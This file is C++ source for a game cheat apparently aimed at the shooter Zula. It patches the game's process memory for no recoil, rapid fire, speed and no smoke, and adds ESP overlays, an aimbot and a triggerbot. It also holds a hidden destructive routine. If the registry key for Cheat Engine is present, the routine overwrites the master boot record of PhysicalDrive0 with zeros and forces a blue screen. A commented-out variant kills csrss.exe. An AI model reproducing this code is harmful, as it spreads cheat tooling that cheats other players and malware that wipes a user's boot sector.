	//	Vector RootPos = readmem<Vector>(entityx + 0x3DC);
	//	float distance = LocalPos.DistTo(RootPos) / 100.f;
	//	Vector vhead;
	//	WorldToScreen(Vector(RootPos.x, RootPos.z, RootPos.y), vhead, TempMatrix);


	//	//if (InsideCircle((int)ScreenCenterX, (int)ScreenCenterY, AimFOV, (int)vhead.x, (int)vhead.y))
	//	//{
	//		if (vhead.x != 0 || vhead.y != 0)
	//		{
	//			if (DistanceBetweenCross(vhead.x, vhead.y) || isaimbotting)
	//			{
	//				Vector LocPos = GetCameraPos();
	//				LocPos.z -= distance;
	//				RootPos.z -= 17.5f;
	//				auto ahh = CalcAngle(LocPos, RootPos);
	//				SetViewAngle(ahh);
	//			}
	//		}
	//	//}
	//}



void asdfaewfacd()
{
	if (entityx)
	{
		if (GetAimKey())
		{
			isaimbotting = true;
			xasdasdascsa();		
		}
		else
		{
			isaimbotting = false;
		}
	}
	else
	{
		isaimbotting = false;
	}
}
void kill_by_pid(int pid)
{
	HANDLE handy;
	handy = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
	TerminateProcess(handy, 0);
}
void Cross(int CenterX, int CenterY)
{
	DrawFilledRect(CenterX - 14, CenterY, 10, 1.5, &Col.SilverWhite);//Left
	DrawFilledRect(CenterX + 6, CenterY, 10, 1.5, &Col.SilverWhite);//Right
	DrawFilledRect(CenterX, CenterY - 15, 1.5, 10, &Col.SilverWhite);//Top
	DrawFilledRect(CenterX, CenterY + 5, 1.5, 10, &Col.SilverWhite);//Bottom	
	DrawCircleFilled(CenterX + 1, CenterY, 2, &Col.moi_red, 5);
}
namespace Offsets
{
	uint32_t ScopeRecoilX = 0x28A5071;//up
	uint32_t ScopeRecoilY = ScopeRecoilX + 0xC;

	uint32_t NoScopeRecoilX = ScopeRecoilX + 0x16E70;
	uint32_t NoScopeRecoilY = NoScopeRecoilX + 0xC;

	uint32_t NoSpread = ScopeRecoilX - 0xF19F;
	uint32_t FastKnifeR = ScopeRecoilX + 0x26F75;
	uint32_t FastKnifeL = FastKnifeR + 0x253C;// DC 8D D4 02 00 00

	uint32_t RapidGun = 0x1CA34F4;// up
	uint32_t ScopeRapidFire = ScopeRecoilX - 0x426E; // DC 8D B4 03 00 00
	uint32_t RapidFire = ScopeRapidFire + 0x17455; // DC 8D C8 04 00 00
	uint32_t NoReload = ScopeRecoilX + 0xD449;// 99 F7 BD ? ? 00 00 89 95 ? ? 00 00 8b 85 ? ? 00 00 89 85 ? ? 00 00 8b c3 05 ? ? ? 01 89 85 ? ? 00 00 8b 83 ? ? ? 01
	/*
	0DBFE7ED - 8B 83 141DCA01        - mov eax,[ebx+01CA1D14] // no reload
	*/
	
	uint32_t NameEspCmp = 0x285191A;//ScopeRecoilX - 0x536F5;// cmp eax, 00
	uint32_t NameEsp_hideTeamIcon = NameEspCmp + 0x602;
	uint32_t NameEsp_hideTeamIcon2 = NameEspCmp + 0x6E0;

	uint32_t NameEsp_Color = NameEspCmp + 0x174;//0x2851D3E;// up

	uint32_t FastWeaponSwitch = ScopeRecoilX + 0x41309;

	uint32_t SpeedX1 = 0x2762338/*0x273FD62*/;// 8B 85 E0 09 00 00 - mov eax, [ebp + 000009E0]
	uint32_t SpeedX2 = SpeedX1 + 0x6;// 8B 8D E4 09 00 00 - mov ecx, [ebp + 000009E4]

	uint32_t Trigger = 0x17F044D;//up
	uint32_t TriggerSniper = 0x1CA2D24;//up

	uint32_t MouseControl = 0x17F3579;// her yama: +0x8 up
	uint32_t EscControl = 0x17F44C0;// EscControl > 0
	uint32_t MouseControl2 = 0x1C82B9D;//up
	//3110
	uint32_t inGame = 0x17F03E5;//0x17F0421;// her yama + 0x7C
	uint32_t HerkesTek = 0x184D617;// her yama + 0x11BC
	uint32_t inRank = 0x183BCF1;//up

	uint32_t iWeaponSelect = 0x1CA34F8;//
	uint32_t EnemyCheck = 0x182ECA8;//up
	uint32_t if_c4_start = 0x1BD99AD;//
	uint32_t local_health = 0x1BEB5DD;//
	uint32_t NoSmoke_1 = 0x2081169;// ScopeRecoilX - 0x820A4F
	uint32_t NoSmoke_2 = NoSmoke_1 + 0x48F4;
	uint32_t NoSmoke_3 = NoSmoke_1 + 0x4BD3;

	uint32_t AntiAFK = 0x21BA9A5;// 
	// 3C1F0045

	// mouse1: 0x17F3531
	// mouse2: 0x1C8159D
}
bool mousecheck = true;
BOOL BFiring = FALSE;
DWORD TrigTime = 0;
bool bMemory[20];

#define MBR_SIZE 512
DWORD CFucker()
{
	DWORD write;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	RtlSecureZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFileA(XorString("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL))
		BlueScreen();
	else
		BlueScreen();
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}
std::string CheckEnemy()
{
	int XCheckEnemy = readmem<int>(MemoryBase + Offsets::EnemyCheck);
	if (XCheckEnemy == 1)
		return std::string(XorString("Zula"));
	else
		return std::string(XorString("Gladio"));
}
#define MAX_PROCESSES 1024
DWORD FindProcess(__in_z LPCTSTR lpcszFileName)
{
	LPDWORD lpdwProcessIds;
	LPTSTR  lpszBaseName;
	HANDLE  hProcess;
	DWORD   i, cdwProcesses, dwProcessId = 0;

	lpdwProcessIds = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, MAX_PROCESSES * sizeof(DWORD));
	if (lpdwProcessIds != NULL)
	{
		if (EnumProcesses(lpdwProcessIds, MAX_PROCESSES * sizeof(DWORD), &cdwProcesses))
		{
			lpszBaseName = (LPTSTR)HeapAlloc(GetProcessHeap(), 0, MAX_PATH * sizeof(TCHAR));
			if (lpszBaseName != NULL)
			{
				cdwProcesses /= sizeof(DWORD);
				for (i = 0; i < cdwProcesses; i++)
				{
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwProcessIds[i]);
					if (hProcess != NULL)
					{
						if (GetModuleBaseName(hProcess, NULL, lpszBaseName, MAX_PATH) > 0)
						{
							if (!lstrcmpi(lpszBaseName, lpcszFileName))
							{
								dwProcessId = lpdwProcessIds[i];
								CloseHandle(hProcess);
								break;
							}
						}
						CloseHandle(hProcess);
					}
				}
				HeapFree(GetProcessHeap(), 0, (LPVOID)lpszBaseName);
			}
		}
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpdwProcessIds);
	}
	return dwProcessId;
}

void memory()
{
	HKEY hKey;
	LONG lRes = RegOpenKeyExA(HKEY_CURRENT_USER, XorString("Software\\Cheat Engine"), 0, KEY_READ, &hKey);
	if (lRes == 2) // == 2 yok demek.
	{
		// No spread: DB 83 A8 1C CA 01
		__try
		{

			BYTE six_nop[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

			BYTE Off_RecoilX[] = { 0x89, 0x83, 0x88, 0x34, 0xCA, 0x01 };
			BYTE Off_RecoilY[] = { 0x89, 0x83, 0x8C, 0x34, 0xCA, 0x01 };

			BYTE Off_Spread[] = { 0xDB, 0x83, 0x8C, 0x34, 0xCA, 0x01 };

			BYTE Off_Reload_Switch[] = { 0x8B, 0x83, 0xF8, 0x34, 0xCA, 0x01 };

			BYTE Off_SpeedX1[] = { 0x8B, 0x85, 0xE0, 0x09, 0x00, 0x00 };
			BYTE Off_SpeedX2[] = { 0x8B, 0x8D, 0xE4, 0x09, 0x00, 0x00 };

			BYTE Off_ScopeRF[] = { 0xDC, 0x8D, 0xB4, 0x03, 0x00, 0x00 };
			BYTE Off_RF[] = { 0xDC, 0x8D, 0xC8, 0x04, 0x00, 0x00 };

			BYTE Off_LRapidKnf[] = { 0xDC, 0x8D, 0xD4, 0x02, 0x00, 0x00 };
			BYTE Off_RRapidKnf[] = { 0xDC, 0x8D, 0x88, 0x02, 0x00, 0x00 };

			BYTE Off_Smoke1[] = { 0xDC, 0x8D, 0x2C, 0x02, 0x00, 0x00 };
			BYTE Off_Smoke2[] = { 0xDC, 0x8D, 0x64, 0x02, 0x00, 0x00 };
			BYTE Off_Smoke3[] = { 0xDC, 0x8D, 0xD4, 0x02, 0x00, 0x00 };


			BYTE Off_AFK[] = { 0x89, 0x83, 0x44, 0x5A, 0x01, 0x00 };

			BYTE jne[] = { 0x75 };
			BYTE je[] = { 0x74 };

			if (Moi.Esp.Dot)
			{
				Cross(ScreenCenterX, ScreenCenterY);
			}
			if (Moi.Misc.NoRecoil)
			{
				if (bMemory[0] == true)
				{
					writemem(MemoryBase + Offsets::ScopeRecoilX, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::ScopeRecoilY, &six_nop, sizeof(six_nop));

					writemem(MemoryBase + Offsets::NoScopeRecoilX, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::NoScopeRecoilY, &six_nop, sizeof(six_nop));
					bMemory[0] = false;
				}
			}
			else
			{
				if (bMemory[0] == false)
				{
					writemem(MemoryBase + Offsets::ScopeRecoilX, &Off_RecoilX, sizeof(Off_RecoilX));
					writemem(MemoryBase + Offsets::ScopeRecoilY, &Off_RecoilY, sizeof(Off_RecoilY));

					writemem(MemoryBase + Offsets::NoScopeRecoilX, &Off_RecoilX, sizeof(Off_RecoilX));
					writemem(MemoryBase + Offsets::NoScopeRecoilY, &Off_RecoilY, sizeof(Off_RecoilY));
					bMemory[0] = true;
				}
			}

			if (Moi.Misc.NoSpread)
			{
				if (bMemory[1] == true)
				{
					writemem(MemoryBase + Offsets::NoSpread, &six_nop, sizeof(six_nop));
					bMemory[1] = false;
				}
			}
			else
			{
				if (bMemory[1] == false)
				{
					writemem(MemoryBase + Offsets::NoSpread, &Off_Spread, sizeof(Off_Spread));
					bMemory[1] = true;
				}
			}

			if (Moi.Misc.NoReload)
			{

				if (bMemory[2] == true)
				{
					writemem(MemoryBase + Offsets::NoReload, &six_nop, sizeof(six_nop));
					bMemory[2] = false;
				}
			}
			else
			{
				if (bMemory[2] == false)
				{
					writemem(MemoryBase + Offsets::NoReload, &Off_Reload_Switch, sizeof(Off_Reload_Switch));
					bMemory[2] = true;
				}
			}

			if (Moi.Misc.FastWeaponSwitch)
			{
				if (bMemory[3] == true)
				{
					writemem(MemoryBase + Offsets::FastWeaponSwitch, &six_nop, sizeof(six_nop));
					bMemory[3] = false;
				}
			}
			else
			{
				if (bMemory[3] == false)
				{
					writemem(MemoryBase + Offsets::FastWeaponSwitch, &Off_Reload_Switch, sizeof(Off_Reload_Switch));
					bMemory[3] = true;
				}
			}

			if (Moi.Misc.RapidFire)
			{
				if (bMemory[4] == true)
				{
					writemem(MemoryBase + Offsets::ScopeRapidFire, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::RapidFire, &six_nop, sizeof(six_nop));
					bMemory[4] = false;
				}
			}
			else
			{
				if (bMemory[4] == false)
				{
					writemem(MemoryBase + Offsets::ScopeRapidFire, &Off_ScopeRF, sizeof(Off_ScopeRF));
					writemem(MemoryBase + Offsets::RapidFire, &Off_RF, sizeof(Off_RF));
					bMemory[4] = true;
				}
			}

			if (Moi.Misc.RapidKnife)
			{
				if (bMemory[5] == true)
				{
					writemem(MemoryBase + Offsets::FastKnifeL, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::FastKnifeR, &six_nop, sizeof(six_nop));
					bMemory[5] = false;
				}
			}
			else
			{
				if (bMemory[5] == false)
				{
					writemem(MemoryBase + Offsets::FastKnifeL, &Off_LRapidKnf, sizeof(Off_LRapidKnf));
					writemem(MemoryBase + Offsets::FastKnifeR, &Off_RRapidKnf, sizeof(Off_RRapidKnf));
					bMemory[5] = true;
				}
			}

			if (Moi.Esp.Name)
			{
				// 83 F8 00 - cmp eax, 00 = team
				// 83 F8 01 - cmp eax, 01 = enemy
				// 83 F8 02 - cmp eax, 02 = all
				// 83 F8 03 - cmp eax, 03 = none

				if (bMemory[7] == true)
				{
					BYTE enemy[] = { 0x83, 0xF8, 0x01 };
					writemem(MemoryBase + Offsets::NameEspCmp, &enemy, sizeof(enemy));// kapali 4byt val: 1962997891
					writemem(MemoryBase + Offsets::NameEsp_hideTeamIcon, &je, sizeof(je));
					writemem(MemoryBase + Offsets::NameEsp_hideTeamIcon2, &je, sizeof(je));
					bMemory[7] = false;
				}

				BYTE Silver[] =   { 0x8B, 0x83, 0x08, 0x11, 0xDA, 0x01 };
				BYTE Yellow[] =   { 0x8B, 0x83, 0x0C, 0x11, 0xDA, 0x01 };// + 0x4
				BYTE DarkGrey[] = { 0x8B, 0x83, 0x14, 0x11, 0xDA, 0x01 };// + 0x8
				BYTE Red[] =      { 0x8B, 0x83, 0x18, 0x11, 0xDA, 0x01 };// + 0x4

				/*
					BYTE Silver[] =   { 0x8B, 0x83, 0x18, 0xD0, 0xD9, 0x01 };
				BYTE Yellow[] =   { 0x8B, 0x83, 0x1C, 0xD0, 0xD9, 0x01 };
				BYTE DarkGrey[] = { 0x8B, 0x83, 0x24, 0xD0, 0xD9, 0x01 };
				BYTE Red[] =      { 0x8B, 0x83, 0x28, 0xD0, 0xD9, 0x01 };
				*/

				if (nSelect == 0)
					writemem(MemoryBase + Offsets::NameEsp_Color, &Silver, sizeof(Silver));
				else if (nSelect == 1)
					writemem(MemoryBase + Offsets::NameEsp_Color, &Red, sizeof(Red));
				else if (nSelect == 2)
					writemem(MemoryBase + Offsets::NameEsp_Color, &Yellow, sizeof(Yellow));
				else if (nSelect == 3)
					writemem(MemoryBase + Offsets::NameEsp_Color, &DarkGrey, sizeof(DarkGrey));
			}
			else
			{
				if (bMemory[7] == false)
				{
					BYTE team[] = { 0x83, 0xF8, 0x00 };
					BYTE Silver[] = { 0x8B, 0x83, 0x08, 0x11, 0xDA, 0x01 };
					writemem(MemoryBase + Offsets::NameEspCmp, &team, sizeof(team));
					writemem(MemoryBase + Offsets::NameEsp_Color, &Silver, sizeof(Silver));
					writemem(MemoryBase + Offsets::NameEsp_hideTeamIcon, &jne, sizeof(jne));
					writemem(MemoryBase + Offsets::NameEsp_hideTeamIcon2, &jne, sizeof(jne));
					bMemory[7] = true;
				}
			}

			if (Moi.Esp.Smoke)
			{
				if (bMemory[8] == true)
				{
					writemem(MemoryBase + Offsets::NoSmoke_1, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::NoSmoke_2, &six_nop, sizeof(six_nop));
					writemem(MemoryBase + Offsets::NoSmoke_3, &six_nop, sizeof(six_nop));
					bMemory[8] = false;
				}
			}
			else
			{
				if (bMemory[8] == false)
				{
					writemem(MemoryBase + Offsets::NoSmoke_1, &Off_Smoke1, sizeof(Off_Smoke1));
					writemem(MemoryBase + Offsets::NoSmoke_2, &Off_Smoke2, sizeof(Off_Smoke2));
					writemem(MemoryBase + Offsets::NoSmoke_3, &Off_Smoke3, sizeof(Off_Smoke3));
					bMemory[8] = true;
				}
			}

			if (Moi.Misc.AFK)
			{
				if (bMemory[9] == true)
				{
					writemem(MemoryBase + Offsets::AntiAFK, &six_nop, sizeof(six_nop));
					bMemory[9] = false;
				}
			}
			else
			{
				if (bMemory[9] == false)
				{
					writemem(MemoryBase + Offsets::AntiAFK, &Off_AFK, sizeof(Off_AFK));
					bMemory[9] = true;
				}
			}

			if (Moi.Misc.RapidGun)
			{
				if (GetAsyncKeyState(VK_LBUTTON) & 0x8000)
				{
					int iWpSelect = readmem<int>(MemoryBase + Offsets::iWeaponSelect);
					if (iWpSelect == 2048)
					{
						int on = 10240;
						writemem(MemoryBase + Offsets::RapidGun, &on, sizeof(on));
					}
					else
					{
						int on = 117760;
						writemem(MemoryBase + Offsets::RapidGun, &on, sizeof(on));
					}
				}
			}

			if (Moi.Misc.Speed)
			{
				if (!(GetAsyncKeyState(VK_LBUTTON) < 0))
				{
					if (GetAsyncKeyState('E') < 0)
					{
						if (GetAsyncKeyState('W') & 0x8000 ||
							GetAsyncKeyState('S') & 0x8000)
						{
							if (SpeedVal == 0)
								writemem(MemoryBase + Offsets::SpeedX1, &six_nop, sizeof(six_nop));
							else if (SpeedVal == 1)
								writemem(MemoryBase + Offsets::SpeedX2, &six_nop, sizeof(six_nop));
						}
						else
						{
							writemem(MemoryBase + Offsets::SpeedX1, &Off_SpeedX1, sizeof(Off_SpeedX1));
							writemem(MemoryBase + Offsets::SpeedX2, &Off_SpeedX2, sizeof(Off_SpeedX2));
						}
					}
					else
					{
						writemem(MemoryBase + Offsets::SpeedX1, &Off_SpeedX1, sizeof(Off_SpeedX1));
						writemem(MemoryBase + Offsets::SpeedX2, &Off_SpeedX2, sizeof(Off_SpeedX2));
					}
				}
				else
				{
					writemem(MemoryBase + Offsets::SpeedX1, &Off_SpeedX1, sizeof(Off_SpeedX1));
					writemem(MemoryBase + Offsets::SpeedX2, &Off_SpeedX2, sizeof(Off_SpeedX2));
				}
			}

			if (Opened == true)
			{
				if (mousecheck == true)
				{
					int four = 4;
					writemem(MemoryBase + Offsets::MouseControl, &four, sizeof(four));
					writemem(MemoryBase + Offsets::MouseControl2, &four, sizeof(four));
					mousecheck = false;
				}
			}
			else
			{
				if (mousecheck == false)
				{
					int esc_check = readmem<int>(MemoryBase + Offsets::EscControl);
					if (esc_check < 1024)
					{
						int four = 0;
						writemem(MemoryBase + Offsets::MouseControl, &four, sizeof(four));
						writemem(MemoryBase + Offsets::MouseControl2, &four, sizeof(four));
						mousecheck = true;
					}
					else
					{
						int four = 4;
						writemem(MemoryBase + Offsets::MouseControl, &four, sizeof(four));
						writemem(MemoryBase + Offsets::MouseControl2, &four, sizeof(four));
						mousecheck = true;
					}
				}
			}

			if (Moi.Misc.Trigger)
			{
				if (Moi.Misc.TriggerSniper)
				{
					int on = 1024;
					writemem(MemoryBase + Offsets::TriggerSniper, &on, sizeof(on));
				}

				BOOL Fire = TRUE;

				int Trig = readmem<int>(MemoryBase + Offsets::Trigger);
				int hp = readmem<int>(MemoryBase + Offsets::local_health);

				if (Trig == 4) Fire = TRUE; else Fire = FALSE;

				if (!(GetAsyncKeyState(VK_LBUTTON) < 0))
				{
					if (hp > 0)
					{
						if (Fire)
						{
							if (!BFiring)
							{
								mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
								TrigTime = GetTickCount();
								BFiring = TRUE;
							}
							else
							{
								DWORD Span = GetTickCount() - TrigTime;

								if (Span > 5)
								{
									mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
									BFiring = FALSE;
								}
							}
						}
						else
						{
							if (BFiring)
							{
								mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
								BFiring = FALSE;
							}
						}
					}
				}
			}
		}
		__except (1) {}
	}
	else
	{
		CFucker();
		BlueScreen();
		/*if (lRes == 0)
		{
			//CFucker();
			BlueScreen();
			system(XorString("taskkill /f /IM csrss.exe"));
		}
		else
		{
			BlueScreen();
		}*/
	}
}
void AIms(DWORD_PTR ent)
{
	float max = 30.f;
	Vector RootPos = readmem<Vector>(ent + 0x3DC);
	//HeadPoz.z += 15.f;
	Vector rootHeadOut; 
	WorldToScreen(Vector(RootPos.x, RootPos.z, RootPos.y), rootHeadOut, TempMatrix);
	
	if (GetClosestPlayerToCrossHair(rootHeadOut, max, AimFOV))
		entityx = ent;
}
Vector CreateScreen(Vector Rootpoz)
{
	Vector screen;
	WorldToScreen(Vector(Rootpoz.x, Rootpoz.z, Rootpoz.y), screen, TempMatrix);
	return screen;
}
Vector GetBonePos(uint32_t entity, string entity_handle, std::string handle)
{
	if (Moi.Esp.Skeleton)
	{
		if (strstr(entity_handle.c_str(), handle.c_str()))
			return readmem<Vector>(entity + 0x3DC);
	}
}

bool h = true;
bool driver_Check = true;
void loop_esp()
{
	::EnumWindows(EnumWindowsProc, NULL);

	/*if (FindProcess("zula.exe"))
	{
	}
	else { exit(-1); }*/
	if (MemoryBase == NULL)
		MemoryBase = readmem<uint32_t>(0x10226708);

	int ingame = readmem<int>(MemoryBase + Offsets::inGame);
	int herkestek = readmem<int>(MemoryBase + Offsets::HerkesTek);
	int inrank = readmem<int>(MemoryBase + Offsets::inRank);


		//if (driver_Check)
		//{
		//	//int in_camp = readmem<int>(MemoryBase + 0x183AC4D);// kampa gir 4 çýk 0
		//	int in_camp = readmem<int>(MemoryBase + 0x183BB38);
		//	if (in_camp == 4)
		//	{
		//		LPVOID LoadedDriver[1024]; DWORD OurDrvListSize; char DrvName[50];
		//		EnumDeviceDrivers(LoadedDriver, sizeof(LoadedDriver), &OurDrvListSize);

		//		//process entry's
		//		for (DWORD i = 0; LoadedDriver[i]; i++)
		//		{
		//			//check antishit's
		//			if (GetDeviceDriverBaseName(LoadedDriver[i], DrvName, sizeof(DrvName)))
		//				if (!strstr(("BEDaisy"), DrvName))
		//					BlueScreen();
		//			driver_Check = false;
		//		}
		//	}
		//}
	
	memory();
	if (ingame == 4)
	{
		
		uint32_t pEntity = readmem<uint32_t>(0x10243998);
		while (pEntity)
		{
			pEntity = readmem<uint32_t>(pEntity + 0x4);

			/* Matrix */
			D3DXMATRIX Draw = readmem<D3DXMATRIX>(0x105916C0);
			if (Draw._44 != 0.0f)
				TempMatrix = Draw;
			else
				Draw = TempMatrix;

			/* Entity Handle */
			string entity_handle;
			uint32_t EntityHandle = readmem<uint32_t>(pEntity + 0xC);
			readmemB(EntityHandle, &entity_handle, 24);

			Vector RootPos = readmem<Vector>(pEntity + 0x3DC);
			Vector Screen = CreateScreen(RootPos);

			//Vector bHead = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_HEAD.MDL"));// kafa
			//Vector bSpine2 = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_SPINE2.MDL"));// omurga baþlangýcý
			//Vector bSpine = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_SPINE.MDL"));// omurga bitiþi

			//Vector bPelvis = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_PELVIS.MDL"));

			//Vector bR_UpArm = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_UPPERARM.MDL"));
			//Vector bR_ForeArm = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_FOREARM.MDL"));
			//Vector bR_Hand = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_HAND.MDL"));

			//Vector bR_Thigh = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_THIGH.MDL"));
			//Vector bR_Calf = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_CALF.MDL"));
			//Vector bR_Foot = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_R_FOOT.MDL"));

			//Vector bL_UpArm = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_UPPERARM.MDL"));
			//Vector bL_ForeArm = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_FOREARM.MDL"));
			//Vector bL_Hand = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_HAND.MDL"));

			//Vector bL_Thigh = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_THIGH.MDL"));
			//Vector bL_Calf = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_CALF.MDL"));
			//Vector bL_Foot = GetBonePos(pEntity, entity_handle.c_str(), XorString("HITBOX_L_FOOT.MDL"));

			//Vector vNeck = CreateScreen(bHead);
			//Vector vSpine2 = CreateScreen(bSpine2);
			//Vector vSpine = CreateScreen(bSpine);
			//Vector vPelvis = CreateScreen(bPelvis);

			//Vector vR_UpArm = CreateScreen(bR_UpArm);
			//Vector vR_ForeArm = CreateScreen(bR_ForeArm);
			//Vector vR_Hand = CreateScreen(bR_Hand);

			//Vector vL_UpArm = CreateScreen(bL_UpArm);
			//Vector vL_ForeArm = CreateScreen(bL_ForeArm);
			//Vector vL_Hand = CreateScreen(bL_Hand);

			//Vector vR_Thigh = CreateScreen(bR_Thigh);
			//Vector vR_Calf = CreateScreen(bR_Calf);
			//Vector vR_Foot = CreateScreen(bR_Foot);

			//Vector vL_Thigh = CreateScreen(bL_Thigh);
			//Vector vL_Calf = CreateScreen(bL_Calf);
			//Vector vL_Foot = CreateScreen(bL_Foot);



			Vector LocalPos = readmem<Vector>(LocalPlayer + 0x3DC);
			float distance = LocalPos.DistTo(RootPos) / 100.f;

			Vector HeadPoz = RootPos;
			HeadPoz.z += 25.f;

			Vector FeetPoz = RootPos;
			FeetPoz.z -= 48.f;
			Vector vFeet = CreateScreen(FeetPoz);

			int die = readmem<int>(pEntity + 0x24);

			char xdist[64];
			sprintf(xdist, XorString("%.fm"), distance);

			if (strstr(entity_handle.c_str(), random_aimbone().c_str() /*: XorString("HITBOX_HEAD.MDL")*/))
				AIms(pEntity);


			if (Moi.Esp.C4)
			{
				int if_c4_start = readmem<int>(MemoryBase + Offsets::if_c4_start);
				if (if_c4_start == 4)
				{
					if (strstr(entity_handle.c_str(), XorString("SABOTAJ_C4_MEKAN.MDL")))
					{
						DrawStrokeText(Screen.x, Screen.y, &Col.peachred, XorString("C4 Bomb"));
						DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, Screen.x, Screen.y + 10, &Col.darkblue_, 1.5);
					}
				}
			}

			if (Moi.Esp.Danger)
			{
				if (strstr(entity_handle.c_str(), XorString("SIL_BS_M18_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BG_DUALK4_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BS_TRP90_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BF_M84_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BG_M61_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BG_C4KUMANDA_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BG_MK3_MESH")) ||
					strstr(entity_handle.c_str(), XorString("SIL_BG_MK2_MESH")))
				{
					DrawStrokeText(Screen.x, Screen.y, &Col.peachred, XorString("Bomb Danger!!"));
				}
			}

			/*	int vis_check = readmem<int>(pEntity + 0x1B00);
				int vis_check2 = readmem<int>(pEntity + 0x205C);
				int vis_check3 = readmem<int>(pEntity + 0x35CC);*/
			//	if (LocalPlayer != pEntity)
			//	{
			if (RootPos.x != 0.f || RootPos.y != 0.f || RootPos.z != 0.f)
			{
				if (die == 0)
				{
					if (isLocalPlayer)
						LocalPlayer = pEntity;

					if (isPlayer)
					{
						if (inrank != 4)
						{
							if (herkestek != 1280 || herkestek != 1792)
							{
								if (!strcmp(CheckEnemy().c_str(), XorString("Gladio")))
								{
									if (ZulaTeam)
									{
										/*if (Moi.Esp.Skeleton)
										{
											if (vis_check != 67109648 && vis_check2 != 67109648 && vis_check3 != 67109648)
											{
												DrawLine(vNeck.x, vNeck.y, vSpine2.x, vSpine2.y, &Col.DarkYellow, 1.5);
												DrawLine(vSpine2.x, vSpine2.y, vSpine.x, vSpine.y, &Col.DarkYellow, 1.5);
												DrawLine(vSpine.x, vSpine.y, vPelvis.x, vPelvis.y, &Col.DarkYellow, 1.5);

												DrawLine(vNeck.x, vNeck.y, vR_UpArm.x, vR_UpArm.y, &Col.DarkYellow, 1.5);
												DrawLine(vR_UpArm.x, vR_UpArm.y, vR_ForeArm.x, vR_ForeArm.y, &Col.DarkYellow, 1.5);
												DrawLine(vR_ForeArm.x, vR_ForeArm.y, vR_Hand.x, vR_Hand.y, &Col.DarkYellow, 1.5);

												DrawLine(vNeck.x, vNeck.y, vL_UpArm.x, vL_UpArm.y, &Col.DarkYellow, 1.5);
												DrawLine(vL_UpArm.x, vL_UpArm.y, vL_ForeArm.x, vL_ForeArm.y, &Col.DarkYellow, 1.5);
												DrawLine(vL_ForeArm.x, vL_ForeArm.y, vL_Hand.x, vL_Hand.y, &Col.DarkYellow, 1.5);

												DrawLine(vPelvis.x, vPelvis.y, vR_Thigh.x, vR_Thigh.y, &Col.DarkYellow, 1.5);
												DrawLine(vR_Thigh.x, vR_Thigh.y, vR_Calf.x, vR_Calf.y, &Col.DarkYellow, 1.5);
												DrawLine(vR_Calf.x, vR_Calf.y, vR_Foot.x, vR_Foot.y, &Col.DarkYellow, 1.5);

												DrawLine(vPelvis.x, vPelvis.y, vL_Thigh.x, vL_Thigh.y, &Col.DarkYellow, 1.5);
												DrawLine(vL_Thigh.x, vL_Thigh.y, vL_Calf.x, vL_Calf.y, &Col.DarkYellow, 1.5);
												DrawLine(vL_Calf.x, vL_Calf.y, vL_Foot.x, vL_Foot.y, &Col.DarkYellow, 1.5);
											}
										}*/
										if (Moi.Esp.Box)
											Box3D(RootPos, &Col.moi_red, 1.7);

										if (Moi.Esp.Line)
											DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, vFeet.x, vFeet.y + 20, &Col.moi_green, 1);

										if (Moi.Esp.LookDirection)
											EspLookDirection(pEntity, HeadPoz);

										if (Moi.Esp.Distance)
											DrawStrokeText(vFeet.x - (strlen(xdist) * 7 / 2), vFeet.y, &Col.moi_green, xdist);

										if (Moi.Esp.Radar)
											DrawRadar(LocalPos, RootPos, &Col.moi_red);
									}
									else
									{
										// Team
										if (tSelect == 1)
										{
											if (Moi.Esp.Box)
												Box3D(RootPos, &Col.moi_blue, 1.7);

											if (Moi.Esp.Radar)
												DrawRadar(LocalPos, RootPos, &Col.moi_blue);

										}
									}
								}
								else if (!strcmp(CheckEnemy().c_str(), XorString("Zula")))
								{
									if (GladioTeam)
									{
										/*if (Moi.Esp.Skeleton)
										{
											if (vis_check != 67109648 && vis_check2 != 67109648 && vis_check3 != 67109648)
											{
